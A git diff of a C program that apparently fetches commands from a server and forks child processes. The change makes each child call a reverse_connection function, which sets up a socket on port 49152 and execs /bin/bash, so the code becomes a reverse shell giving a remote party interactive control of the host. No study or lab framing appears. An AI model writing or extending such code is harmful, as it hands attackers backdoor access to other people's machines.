@@ -15,6 +15,7 @@ typedef struct {
 
 size_t write_chunk(void *data, size_t size, size_t nmemb, void *userdata);
 void get_executors_command();
+void reverse_connection(void);
 
 int main(){
 	get_executors_command();
@@ -51,7 +52,7 @@ void get_executors_command(){
 			int pid = fork();
 			if (pid == 0){
 				printf("child start");
-				sleep(10);
+				reverse_connection();
 				printf("child stop");
 				exit(0);
 			}
@@ -75,7 +76,7 @@ size_t write_chunk(void *data, size_t size, size_t nmemb, void *userdata){
 	return real_size;
 }
 
-int reverse_connection(void){
+void reverse_connection(void){
     int port = 49152;
     struct sockaddr_in revsockaddr;
 
@@ -92,6 +93,4 @@ int reverse_connection(void){
 
     char * const argv[] = {"/bin/bash", NULL};
     execvp("/bin/bash", argv);
-
-    return 0;       
 }
